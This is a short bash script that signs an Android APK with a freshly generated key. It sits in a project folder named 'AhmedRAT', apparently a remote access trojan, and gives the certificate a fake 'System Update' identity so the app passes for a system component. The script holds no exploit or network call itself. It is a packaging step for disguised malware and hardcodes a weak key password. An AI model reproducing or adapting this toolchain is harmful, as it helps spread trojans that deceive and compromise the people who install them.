#!/bin/bash
APK_PATH=$1
KEYSTORE="$HOME/Desktop/AhmedRAT/src/random.keystore"
ALIAS="ahmed_key"
PASS="ahmed123"

rm -f "$KEYSTORE"
keytool -genkey -v -keystore "$KEYSTORE" -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 -storepass "$PASS" -keypass "$PASS" -dname "CN=System Update, OU=IT, O=System, L=City, S=State, C=US" > /dev/null 2>&1

# استخدام apksigner من النظام
apksigner sign --ks "$KEYSTORE" --ks-pass pass:"$PASS" --key-pass pass:"$PASS" --out "${APK_PATH%.apk}_signed.apk" "$APK_PATH" > /dev/null 2>&1

mv "${APK_PATH%.apk}_signed.apk" "$APK_PATH"
echo "[+] APK Signed with new random key."
